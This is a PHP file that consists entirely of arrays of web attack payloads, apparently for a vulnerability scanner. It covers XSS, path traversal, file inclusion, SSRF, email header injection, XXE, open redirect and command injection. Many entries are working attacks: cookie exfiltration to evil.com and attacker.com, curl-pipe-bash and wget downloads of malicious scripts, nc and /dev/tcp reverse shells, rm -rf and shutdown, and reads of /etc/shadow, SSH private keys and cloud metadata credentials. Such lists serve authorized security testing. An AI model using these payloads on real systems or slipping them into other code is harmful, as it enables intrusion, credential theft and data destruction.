<?php

$xss_payloads = [
    "<script>alert(1)</script>",  // Basic script injection
    "\"><script>alert(1)</script>",  // Closing quote + script injection
    "<img src='x' onerror='alert(1)' />",  // Image with error handler
    "<img src='javascript:alert(1)' />",  // JavaScript URI scheme in image tag
    "<svg/onload=alert(1)>",  // SVG-based XSS
    "<a href='javascript:alert(1)'>click me</a>",  // JavaScript in anchor tag
    "<body onload=alert(1)>",  // Body tag with onload event
    "<iframe src='javascript:alert(1)'></iframe>",  // Iframe with JavaScript
    "<script src=//evil.com/malicious.js></script>",  // External script injection
    "<svg><script>alert(1)</script></svg>",  // SVG element with injected script
    "<div style='background:url(javascript:alert(1))'>",  // CSS background image attack
    "<input type='text' value='\" onfocus='alert(1)' />",  // Input focus event XSS
    "<a href=\"javascript:alert(1)\">Click me</a>",  // Another anchor tag with JavaScript
    "<marquee onstart=alert(1)>Test</marquee>",  // Marquee tag with event
    "<img src='x' onerror='fetch(1)' />",  // File fetching via error handler
    "<svg><use href='x' onload='alert(1)'></use></svg>",  // SVG with use element
    "<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA...' onerror='alert(1)' />",  // Base64 data URL with error handling
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",  // Inline frame with injected script
    "<script>alert(document.cookie)</script>",  // Alerting cookies
    "<script>eval('alert(1)')</script>",  // Using eval for script execution
    "<script>setTimeout('alert(1)', 1000)</script>",  // Delayed execution using setTimeout
    "<script>window.location='javascript:alert(1)'</script>",  // Redirect to malicious URI
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",  // Dynamically writing image element
    "<a href='#' onclick='alert(1)'>Click Me</a>",  // Anchor with onclick handler
    "<button onclick='alert(1)'>Press Me</button>",  // Button with onclick handler
    "<div onmouseover='alert(1)'>Hover over me</div>",  // Mouseover event handler
    "<a href='data:text/html,<script>alert(1)</script>'>Click Me</a>",  // Data URI with embedded script
    "<div ondrop='alert(1)'>Drop here</div>",  // Drop event XSS
    "<input type='text' value='<script>alert(1)</script>' />",  // Input field with script as value
    "<script>document.location='javascript:alert(1)';</script>",  // Location-based redirect with JavaScript
    "<div onfocus='alert(1)' tabindex='0'></div>",  // Focus event handler
    "<script>location.href='javascript:alert(1)'</script>",  // Location redirection
    "<script>window.open('javascript:alert(1)')</script>",  // Open new window with XSS payload
    "<iframe srcdoc='</script><script>alert(1)</script>'></iframe>",  // Iframe with embedded XSS
    "<img src=1 onerror='alert(1)'>",  // Minimal image tag XSS
    "<body onload=eval('alert(1)')>",  // Body load event with eval
    "<style>@import 'javascript:alert(1)';</style>",  // CSS import attack
    "<script src=data:text/javascript;base64,YWx...Q==></script>",  // Base64 encoded malicious script
    "<script>document.cookie='cookie=test'; alert(document.cookie)</script>",  // Cookie leakage via XSS
    "<input type='text' value=\"<script>alert(1)</script>\" />",  // Injecting script in input's value attribute
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",  // Meta refresh tag with XSS
    "<a href='javascript:alert(1);' target='_blank'>Click Me</a>",  // Link opening in new tab with XSS
    "<audio src='javascript:alert(1)' />",  // Audio tag with JavaScript URL
    "<video src='javascript:alert(1)' />",  // Video tag with JavaScript URL
    "<link rel='stylesheet' href='javascript:alert(1)' />",  // Link tag with JavaScript URL
    "<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>",  // Exfiltration of cookies via fetch
    "<script>document.write('<img src=x onerror=fetch(`http://evil.com?cookie=' + document.cookie)` />')</script>",  // Exfiltrating cookies with image error
    "<script>window.open('http://attacker.com?cookie=' + document.cookie)</script>",  // Opening a window with exfiltrated cookie data
    "<script>setInterval('alert(1)', 500)</script>",  // Repeated execution using setInterval
    "<script>document.body.innerHTML = '<h1>XSS</h1>'</script>",  // Injecting content into body using JavaScript
    "<a href='javascript:confirm(1)'>Click Me</a>",  // Confirm dialog XSS
    "<script>void(alert(1))</script>",  // Void operator to execute script
    "<script>window.name='javascript:alert(1)';</script>",  // Manipulating window name property
    "<script>open('javascript:alert(1)', '_blank');</script>",  // Opening a blank window with JavaScript
    "<form action='javascript:alert(1)' method='post'><input type='submit' value='Submit'></form>",  // Form submission triggering XSS
    "<a href='http://evil.com?cookie=' + document.cookie>Click Me</a>",  // Exfiltrating cookies via anchor
];

$traversal_payloads = [
    "../../../../etc/passwd",
    "../index.php",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",  // URL encoded
    "..%252f..%252f..%252f..%252fetc%252fpasswd", // Double URL encoded
    "..\\..\\..\\..\\windows\\win.ini", // Windows traversal
    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", // Unicode encoding
    "..;/..;/..;/..;/etc/passwd", // Path separator obfuscation
    "....//....//....//etc//passwd", // Double dot bypass
    "/etc/passwd%00", // Null byte injection
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd", // Alternative URL encoding
    "..%5C..%5C..%5C..%5Cetc%5Cpasswd", // Backslash encoding
    "..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe", // Windows command execution
    "....//....//....//windows//win.ini",
    "../../../../../../../../../../etc/passwd", // Deep traversal attempt
    "../../../../../../../../../../windows/win.ini",
    "..%u2215..%u2215..%u2215..%u2215etc%u2215passwd", // Unicode encoded slashes
    "../../../../../../../../../../boot.ini",
    "../../../../../../../../../../var/www/html/config.php",
    "../../../../../../../../../../usr/local/etc/shadow"
];

$rfi_payloads = [
    "http://evil.com/shell.txt",  // Basic external shell inclusion
    "http://evil.com/shell.php",  // Remote PHP shell
    "http://evil.com/backdoor.php",  // Backdoor inclusion
    "https://raw.githubusercontent.com/attacker/malicious-code/main/shell.php",  // Raw GitHub file inclusion
    "ftp://evil.com/shell.php",  // FTP-based inclusion
    "php://filter/convert.base64-encode/resource=index.php",  // Base64 encoding LFI
    "php://input",  // Inject PHP code via POST data
    "php://filter/read=convert.base64-encode/resource=config.php",  // Base64-encoded config file
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  // Data URI scheme for RFI
    "file:///etc/passwd",  // Local file inclusion via file://
    "file:///C:/Windows/system.ini",  // Windows file inclusion
    "file://../../../../etc/passwd",  // LFI with traversal
    "file://../../../../var/www/html/config.php",  // Targeting configuration files
    "file://../../../../usr/local/etc/shadow",  // Shadow file extraction
    "http://127.0.0.1:80/index.php",  // SSRF-based RFI to localhost
    "http://localhost:8080/admin.php",  // Targeting internal admin panels
    "gopher://127.0.0.1:6379/_%0D%0Ainfo%0D%0A",  // SSRF attack using gopher://
    "dict://127.0.0.1:25/",  // SMTP SSRF attempt
    "http://169.254.169.254/latest/meta-data/",  // AWS metadata SSRF
    "http://evil.com/shell.php?cmd=whoami",  // RFI with command execution
    "http://evil.com/shell.php?cmd=id",  // Running system commands via RFI
    "http://evil.com/shell.php?cmd=cat%20/etc/passwd",  // Reading system files
    "http://evil.com/shell.php?cmd=nc%20-lvp%204444%20-e%20/bin/bash",  // Reverse shell
    "http://evil.com/shell.php?cmd=rm%20-rf%20/",  // Destructive payload
    "http://evil.com/shell.php?cmd=wget%20http://malicious.com/malware.sh%20-O%20/tmp/malware.sh",  // Download and execute malware
    "expect://ls",  // Abuse of PHP expect:// wrapper
    "zip://evil.zip#shell.php",  // Zip-based RFI
    "phar://evil.phar",  // PHP phar wrapper attack
    "glob://*.php",  // Glob wildcard attack
    "http://evil.com/shell.php?payload=<script>alert('XSS')</script>",  // XSS injection via RFI
    "http://evil.com/shell.php?payload=<?php system('ls'); ?>",  // PHP code execution
    "http://127.0.0.1/protected/admin.php",  // Accessing internal admin panel
    "http://[::1]/config.php",  // IPv6 loopback access
    "http://attacker.com/evil.sh | bash",  // Shell execution via HTTP
    "data://text/plain,<?php system('cat /etc/passwd'); ?>",  // Data wrapper for direct execution
];  

$lfi_payloads = [
    "../../../../etc/passwd",  // Basic Unix LFI
    "../../../../etc/shadow",  // Linux shadow file
    "../../../../etc/hosts",  // Hosts file (DNS mappings)
    "../../../../etc/group",  // Group file for user enumeration
    "../../../../etc/hostname",  // Retrieve hostname
    "../../../../etc/issue",  // Get OS info
    "../../../../etc/profile",  // System-wide environment variables
    "../../../../var/log/auth.log",  // Authentication logs
    "../../../../var/log/apache2/access.log",  // Apache access logs
    "../../../../var/log/apache2/error.log",  // Apache error logs
    "../../../../proc/self/cmdline",  // Command-line arguments of the running process
    "../../../../proc/self/environ",  // Environment variables
    "../../../../proc/version",  // Kernel version information
    "../../../../proc/net/tcp",  // Active TCP connections
    "../../../../proc/net/arp",  // ARP cache information
    "../../../../proc/net/fib_trie",  // Routing table
    "../../../../proc/net/wireless",  // Wireless network info
    "../../../../var/www/html/config.php",  // Configuration files
    "../../../../home/user/.bash_history",  // User command history
    "../../../../root/.bashrc",  // Root user shell configuration
    "../../../../root/.ssh/id_rsa",  // Private SSH key (if accessible)
    "../../../../boot.ini",  // Windows boot configuration
    "../../../../windows/win.ini",  // Windows system file
    "../../../../windows/system.ini",  // Another Windows system file
    "../../../../windows/system32/drivers/etc/hosts",  // Windows hosts file
    "../../../../windows/system32/config/sam",  // Windows SAM file
    "../../../../windows/system32/config/system",  // Windows system configuration
    "../../../../windows/system32/logfiles/srt/srttrail.txt",  // Windows recovery logs
    "php://filter/convert.base64-encode/resource=index.php",  // Base64 encode LFI
    "php://filter/read=convert.base64-encode/resource=config.php",  // Base64-encoded config file
    "php://input",  // Execute input stream via POST
    "php://memory",  // Memory stream abuse
    "php://stdin",  // Direct input access
    "php://output",  // Output stream access
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  // Data wrapper for PHP execution
    "file:///etc/passwd",  // Direct file access via file://
    "file:///C:/Windows/system.ini",  // Windows LFI
    "file://../../../../etc/passwd",  // File traversal via file://
    "file://../../../../var/www/html/config.php",  // File access via traversal
    "zip://evil.zip#shell.php",  // Zip-based LFI
    "phar://evil.phar",  // PHP Phar wrapper exploit
    "expect://ls",  // Expect wrapper for command execution
    "glob://*.php",  // Glob wildcard attack
    "../../../../../../../../../../../etc/passwd",  // Deep traversal
    "../../../../../../../../../../../windows/win.ini",  // Windows deep traversal
    "../../../../../../../../../../../usr/local/etc/shadow",  // Deep traversal for Unix shadow file
    "/proc/self/fd/0",  // File descriptor abuse
    "/proc/self/fd/1",  // Standard output file descriptor
    "/proc/self/fd/2",  // Standard error file descriptor
    "/dev/fd/0",  // Alternate file descriptor path
    "/dev/fd/1",  // Another file descriptor path
    "/dev/fd/2",  // More file descriptor exploitation
    "/proc/self/cmdline%00",  // Null byte injection attempt
    "/proc/self/environ%00",  // Null byte environment leakage
    "../../../../../../etc/passwd%00",  // Null byte termination
    "../../../../etc/passwd%00index.php",  // Double file trick
    "../../../../../../../../../../etc/passwd?",  // Query parameter bypass
    "../../../../etc/passwd?anything",  // Adding query to bypass filtering
    "..%2f..%2f..%2f..%2fetc%2fpasswd",  // URL encoded traversal
    "..%252f..%252f..%252f..%252fetc%252fpasswd",  // Double URL encoding
    "..%00/../etc/passwd",  // Null byte with traversal
    "..%5C..%5C..%5C..%5Cetc%5Cpasswd",  // Backslash encoding
    "..\\..\\..\\..\\windows\\win.ini",  // Windows LFI traversal
    "....//....//....//etc//passwd",  // Overlapping traversal
    "....//....//....//windows//win.ini",  // Windows overlapping traversal
    "../../../../../../etc/passwd%00.jpg",  // Extension spoofing
    "http://127.0.0.1/etc/passwd",  // SSRF LFI attempt
    "http://localhost:8080/admin.php",  // SSRF-based LFI
    "http://metadata.google.internal/computeMetadata/v1/",  // GCP metadata
    "http://169.254.169.254/latest/meta-data/",  // AWS metadata
  ];

  $ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",  // AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/user-data",
    "http://localhost",  // Localhost access
    "http://localhost:22/",  // SSH service check
    "http://localhost:80/",  // Web server check
    "http://localhost:443/",  // HTTPS check
    "http://localhost:8080/",  // Common internal web app port
    "http://127.0.0.1/",  // IPv4 loopback
    "http://127.0.0.1:3306/",  // MySQL database access
    "http://127.0.0.1:6379/",  // Redis instance check
    "http://127.0.0.1:5000/",  // Flask app check
    "http://127.0.0.1:8000/",  // Django development server
    "http://[::1]/",  // IPv6 loopback
    "http://[::1]:8080/",  // IPv6 web app check
    "http://192.168.1.1/",  // Common router address
    "http://192.168.0.1/",  // Another common router address
    "http://10.0.0.1/",  // Internal network target
    "http://internal-service/",  // Potential internal service
    "http://api.internal/",  // Internal API
    "http://admin.internal/",  // Internal admin panel
    "http://dev.internal/",  // Development server
    "http://test.internal/",  // Test environment
    "http://metadata.google.internal/computeMetadata/v1/",  // Google Cloud metadata
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://100.100.100.200/latest/meta-data/",  // Alibaba Cloud metadata
    "http://httpbin.org/anything",  // External SSRF testing endpoint
    "http://burpcollaborator.net/",  // External exfiltration check
    "http://requestbin.net/r/1234",  // Custom request bin for logging SSRF requests
    "http://example.com@evil.com/",  // Open redirect trick
    "http://evil.com#@example.com/",  // Fragment-based redirect
    "http://localhost/.git/config",  // Git repository leak check
    "http://localhost/etc/passwd",  // Attempt to read system files
    "http://169.254.169.254/latest/meta-data/?param=<script>alert('XSS')</script>",  // XSS payload in SSRF
    "file:///etc/passwd",  // File access via SSRF
    "file:///C:/Windows/win.ini",  // Windows file access
    "dict://127.0.0.1:25/",  // SMTP service SSRF
    "gopher://127.0.0.1:6379/_%0D%0Ainfo%0D%0A",  // Redis SSRF injection
    "gopher://127.0.0.1:11211/_stats%0D%0A",  // Memcached SSRF check
    "ftp://127.0.0.1/",  // FTP service SSRF
    "sftp://127.0.0.1/",  // SFTP service SSRF
    "http://evil.com/?q=<script>alert(1)</script>",  // XSS via SSRF
    "http://169.254.169.254/latest/meta-data/;wget http://evil.com/malware.sh -O /tmp/malware.sh",  // Command injection attempt
    "http://localhost:80/admin",  // Internal admin panel access
];

$email_payloads = [
    "\r\nBcc: attacker@evil.com",  // Injecting Bcc header
    "\r\nSubject: Hacked",  // Injecting Subject header
    "\r\nCc: attacker@evil.com",  // Injecting Cc header
    "\r\nFrom: hacker@evil.com",  // Injecting From header
    "\r\nReply-To: hacker@evil.com",  // Injecting Reply-To header
    "\r\nDate: Tue, 01 Jan 2025 00:00:00 +0000",  // Manipulating Date header
    "\r\nX-Mailer: TestMailer",  // Manipulating X-Mailer header
    "\r\nX-Forwarded-For: 127.0.0.1",  // Injecting X-Forwarded-For header
    "\r\nReturn-Path: attacker@evil.com",  // Injecting the Return-Path header
    "\r\nMIME-Version: 1.0",  // Manipulating MIME version header
    "\r\nContent-Type: text/html",  // Injecting Content-Type header (HTML)
    "\r\nContent-Disposition: attachment; filename=evil.php",  // File attachment header
    "\r\nContent-Length: 1000",  // Manipulating Content-Length header
    "\r\nX-Injected-Header: vulnerable",  // Custom injected header
    "\r\nX-Frame-Options: SAMEORIGIN",  // X-Frame header injection
    "\r\nX-Content-Type-Options: nosniff",  // X-Content-Type header injection
    "\r\nX-XSS-Protection: 1; mode=block",  // XSS protection header manipulation
    "\r\nCache-Control: no-cache",  // Cache-control manipulation
    "\r\nPragma: no-cache",  // Cache control (older HTTP standard)
    "\r\nExpires: 0",  // Expiry manipulation
    "\r\nAccept-Language: en-US,en;q=0.5",  // Accept-Language header manipulation
    "\r\nAuthorization: Basic YWRtaW46cGFzc3dvcmQ=",  // Authorization header (basic authentication)
    "\r\nCookie: sessionid=malicious; user=attacker",  // Cookie injection
    "\r\nSet-Cookie: id=attacker_cookie; path=/",  // Setting malicious cookie
    "\r\nX-Debug: true",  // Debug header for bypass
    "\r\nX-Real-IP: 192.168.1.100",  // Spoofing the real IP address
    "\r\nX-API-Key: 1234567890abcdef",  // Injecting API key header
    "\r\nX-Request-ID: 1234567890",  // Request ID header injection
    "\r\nX-Remote-IP: 192.168.0.1",  // Remote IP spoofing
    "\r\nX-Requested-With: XMLHttpRequest",  // XMLHttpRequest header for AJAX
    "\r\nX-Forwarded-Proto: https",  // Spoofing the protocol (HTTPS)
    "\r\nForwarded: for=192.168.1.1;proto=https;by=evil.com",  // Forwarded header manipulation
    "\r\nX-Content-Encoding: gzip",  // Content encoding header manipulation
    "\r\nTransfer-Encoding: chunked",  // Transfer encoding manipulation
    "\r\nContent-Encoding: deflate",  // Injecting deflate content encoding
    "\r\nX-Cache: HIT",  // Cache-related header manipulation
    "\r\nX-Host: evil.com",  // Host header injection
    "\r\nX-Original-URL: /malicious",  // URL manipulation
    "\r\nX-Request-Start: t=1234567890",  // Timing attack header injection
    "\r\nX-Security: vulnerable",  // Injecting a custom security header
    "\r\nX-Custom-Header: exploit",  // Custom header injection
    "\r\nX-DNS-Prefetch-Control: off",  // DNS prefetch control header injection
    "\r\nX-Device: mobile",  // Device-related header injection
    "\r\nX-Real-Time: true",  // Real-time header injection
    "\r\nX-Unsafe-Header: attack",  // Another custom header to look for
    "\r\nX-Style: vulnerable",  // Injecting a styling header (for CSS/JS-based exploits)
    "\r\nX-Language: en",  // Language-based header injection
    "\r\nX-SSRF-Check: true",  // SSRF-related header injection
    "\r\nX-Timeout: 10000",  // Timeout manipulation header
    "\r\nX-Priority: 1",  // Email priority manipulation
    "\r\nX-Include: /etc/passwd",  // Attempted file inclusion via header
    "\r\nX-Fwd-Proxy: 192.168.1.1",  // Forwarded proxy header
    "\r\nX-Client-IP: 10.0.0.1",  // Client IP header injection
    "\r\nX-Proxy-Connection: Keep-Alive",  // Proxy connection header injection
    "\r\nX-Forwarded-Port: 443",  // Port manipulation header
    "\r\nX-Powered-By: PHP/7.4.0",  // Powering script version
    "\r\nX-Attacker: 1",  // Simple attacker identification header
    "\r\nX-Invalid-Header: test123",  // Test injection of invalid header
    "\r\nX-Referer: http://evil.com",  // Referer header manipulation
    "\r\nX-URL-Rewrite-Options: useURL",  // URL rewrite manipulation
    "\r\nX-Cache-Control: no-store",  // Cache control injection for bypass
    "\r\nX-Timestamp: 1609459200",  // Timestamp injection for attack tracking
    "\r\nX-Bot-Detection: false",  // Injecting bot detection bypass
    "\r\nX-IP-Blocked: false",  // Blocking the IP check header
    "\r\nX-Content-Policy: allow-all",  // Content security policy manipulation
    "\r\nX-Request-Context: user=attacker",  // Request context manipulation
    "\r\nX-User-Agent: malicious",  // Spoofing the User-Agent header
    "\r\nX-Locale: en_US",  // Locale header manipulation
    "\r\nX-Language-Preference: en",  // Language preference manipulation
    "\r\nX-Malicious-Request: true",  // Request marked as malicious
    "\r\nX-Application-Name: attack-app",  // Injecting application name header
];

$xxe_payloads = [
    // Basic XXE payload to read a local file (e.g., /etc/passwd)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    
    // Attempting to access the current working directory
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cwd">]><foo>&xxe;</foo>',
    
    // Attempting to access a network resource (could be used to access an internal server or service)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8000">]><foo>&xxe;</foo>',
    
    // Accessing a sensitive file in Windows systems
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><foo>&xxe;</foo>',
    
    // Accessing PHP's session file (common for web applications)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/lib/php/sessions/sess_<session_id>">]><foo>&xxe;</foo>',
    
    // Attempting to access a sensitive log file (common in misconfigured servers)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/log/syslog">]><foo>&xxe;</foo>',
    
    // Accessing XML configuration file (XML-based config files in many applications)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/config.xml">]><foo>&xxe;</foo>',
    
    // Accessing system information file on Unix-like systems
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
    
    // Attempting to execute an OS command (e.g., `ping`)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/payload?cmd=ping%20-c%201%20127.0.0.1">]><foo>&xxe;</foo>',
    
    // Reading environment variables (dangerous if system is misconfigured)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
    
    // Using an external DTD for external attack (often abused for SSRF or to leak internal data)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">]><foo>&xxe;</foo>',
    
    // Attempt to include a local file using external entity (often results in information leak)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/secret_file.txt">]><foo>&xxe;</foo>',
    
    // Exploiting XXE to execute an HTTP request to an internal service or internal API endpoint
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-api.local/data">]><foo>&xxe;</foo>',
    
    // Accessing XML file on a network share (Windows-style UNC path)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://\\\\evil-server\\share\\file.xml">]><foo>&xxe;</foo>',
    
    // Accessing sensitive memory (attempt to leak memory address or process memory)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/mem">]><foo>&xxe;</foo>',
    
    // Testing external entity to retrieve remote server information (DNS lookup, SSRF)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com:8080/ssrf">]><foo>&xxe;</foo>',
    
    // Trying to retrieve a file from a cloud metadata service (e.g., AWS, GCP metadata API)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    
    // Executing OS commands via XXE (Remote Code Execution)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/exploit.php">]><foo>&xxe;</foo>',
    
    // Targeting a well-known system path
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>'
];

$redirect_payloads = [
    "http://evil.com",  // Simple HTTP redirect
    "//evil.com",  // Protocol-relative URL
    "http://evil.com%0A",  // URL with newline encoding
    "http://evil.com#malicious",  // URL with fragment identifier (can bypass some filters)
    "http://evil.com:8080",  // URL with a custom port
    "https://evil.com",  // HTTPS redirect
    "ftp://evil.com",  // FTP redirect
    "file:///etc/passwd",  // Attempting a local file redirect (may not work in browsers)
    "data:text/html;base64,PGh0bWw+PHA+Tm9oZXJpbmcgaW5qZWN0ZWQgdGV4dC48L3A+PC9odG1sPg==",  // Base64-encoded HTML redirect
    "javascript:window.location='http://evil.com';",  // JavaScript redirect
    "http://example.com?redirect=http://evil.com",  // Redirect via query parameter
    "http://example.com/redirect?url=http://evil.com",  // Another query parameter redirect
    "http://evil.com?redirect_to=http://good.com",  // Redirect via custom query parameter
    "http://evil.com/redirect?target=http://good.com",  // Redirect with target parameter
    "http://evil.com/#http://good.com",  // Using a fragment to perform redirect
    "http://evil.com?redir=http://good.com",  // Using another common parameter for redirects
    "http://evil.com?goto=http://good.com",  // Common parameter used in open redirects
    "//evil.com?redir=https://target.com",  // Protocol-relative with query param
    "http://evil.com?target=https://good.com",  // Redirect with target parameter
    "http://evil.com?destination=https://good.com",  // Redirect using 'destination' param
    "https://evil.com?url=http://good.com",  // Secure redirect to HTTP link
    "http://evil.com?redirect=http://internal-site.com",  // Internal site redirect (SSRF risk)
    "http://evil.com#redirect=http://good.com",  // Fragment-based redirect
    "http://evil.com/redirect?path=internal",  // Redirect with path
    "http://evil.com/?redirect_uri=http://good.com",  // OAuth-like redirect with URI parameter
    "https://evil.com/redirect?to=http://good.com",  // HTTPS redirect with a 'to' parameter
    "//evil.com/redirect?path=http://good.com",  // Path-based redirect with protocol-relative URL
    "http://evil.com/redirect?query=https://good.com",  // Redirect with query parameter
    "http://evil.com/?target=https://good.com",  // Target redirect with query parameter
    "http://evil.com/#/http://good.com",  // Using fragment with redirect
    "http://evil.com?next=http://good.com",  // Another common query parameter used for redirects
    "http://evil.com?forward=http://good.com",  // Using 'forward' query parameter
    "http://evil.com?url=http://good.com#fragment",  // Redirect with both URL and fragment
    "http://evil.com?return=https://good.com",  // Using 'return' parameter to indicate redirect target
    "http://evil.com/redirect?url=//good.com",  // Protocol-relative redirect with full URL
    "http://evil.com/redirect?go=http://good.com",  // Common 'go' parameter for redirecting
    "http://evil.com?goto=http://good.com",  // 'goto' parameter redirect
    "http://evil.com/?redirect=https://good.com",  // Redirect via 'redirect' parameter
    "http://evil.com?destination=http://good.com&redirect=true",  // Redirect with multiple parameters
    "http://evil.com?redirect_uri=http://good.com&param=1",  // OAuth-style redirect with extra param
    "http://evil.com?redirect=http://internal-app.local",  // Redirect to an internal application
    "https://evil.com/#/http://good.com",  // Using fragment with redirect
    "http://evil.com/#redirect=https://good.com",  // Fragment-based redirection
    "http://evil.com?goto=https://good.com&next=1",  // Multiple redirect parameters
    "http://evil.com/redirect?dest=http://good.com",  // Using 'dest' as the redirect parameter
    "http://evil.com/redirect?destination=http://good.com",  // Another 'destination' parameter-based redirect
    "http://evil.com/#redirect=https://good.com",  // Fragment-based redirect attack
    "http://evil.com/?continue=http://good.com",  // 'continue' parameter redirect
    "http://evil.com?nextpage=http://good.com",  // Common redirect parameter with multiple query params
    "http://evil.com?redir=http://good.com",  // Another commonly used 'redir' parameter
    "http://evil.com/redirect?ref=http://good.com",  // Referrer-based redirect
    "http://evil.com?redirect_to=http://good.com",  // Alternate name for redirect parameter
    "http://evil.com?url=http://good.com#frag",  // Combining redirect and fragment
    "http://evil.com/redirect?next_url=http://good.com",  // URL redirection with 'next_url' parameter
    "http://evil.com/?target_url=http://good.com",  // Another form of redirect with 'target_url'
    "http://evil.com/forward?target=https://good.com",  // Forward URL with redirect param
];

$cmd_payloads = [
    "; ls",  // List directory contents
    "| cat /etc/passwd",  // Read system passwd file
    "`whoami`",  // Execute whoami command to see the user running the script
    "; cat /etc/shadow",  // Read the shadow file (if permissions allow)
    "`id`",  // Get user ID and group ID
    "; uname -a",  // Get system information
    "`top -n 1`",  // Run the top command for system statistics
    "; ping -c 4 127.0.0.1",  // Ping localhost to test command execution
    "; echo test > /tmp/testfile",  // Write to a temporary file
    "`curl http://evil.com`",  // Fetch data from an external malicious server
    "; rm -rf /tmp/*",  // Delete files in the /tmp directory (destructive)
    "`wget http://evil.com/malicious.sh -O /tmp/malicious.sh; sh /tmp/malicious.sh`",  // Download and execute a malicious script
    "; nc -e /bin/bash 127.0.0.1 4444",  // Open a reverse shell (dangerous)
    "; curl -X POST -d 'cmd=whoami' http://evil.com" ,  // Send command result to an external server
    "`cat /proc/self/environ`",  // Get environment variables of the running process
    "; touch /tmp/testfile && echo 'Injected' > /tmp/testfile",  // Create and modify a file
    "; sudo ls",  // Attempt to run a command with sudo (may require privilege escalation)
    "`nc -v -w 3 127.0.0.1 80`",  // Attempt to connect to a service on port 80
    "; shutdown -h now",  // Shutdown the machine (dangerous)
    "`whois evil.com`",  // Perform a whois lookup on a domain
    "; find / -name 'testfile'",  // Search for files on the system
    "`lsof`",  // List open files on the system
    "; tail -n 10 /var/log/auth.log",  // Read recent authentication logs
    "`curl -fsSL http://evil.com/malicious.sh | bash`",  // Download and execute a script
    "; echo 'test' > /dev/tcp/127.0.0.1/4444",  // Send data to a listener on port 4444 (testing for reverse shell)
    "; df -h",  // Get disk space usage
    "`ps aux`",  // Get a list of running processes
    "`cat /var/log/syslog`",  // Read the system log
    "; mkdir /tmp/test && echo 'Injected' > /tmp/test/injected.txt",  // Create a test directory and inject text into a file
    "`dig @evil.com example.com`",  // Use `dig` to perform a DNS query
    "; curl -I http://evil.com",  // Get HTTP headers from a malicious site
    "; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",  // Reverse shell command
    "; curl http://evil.com/shell.sh | bash",  // Execute a remote shell script
    //"; python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("127.0.0.1", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['/bin/bash', '-i']);'",  // Python reverse shell
];


?>
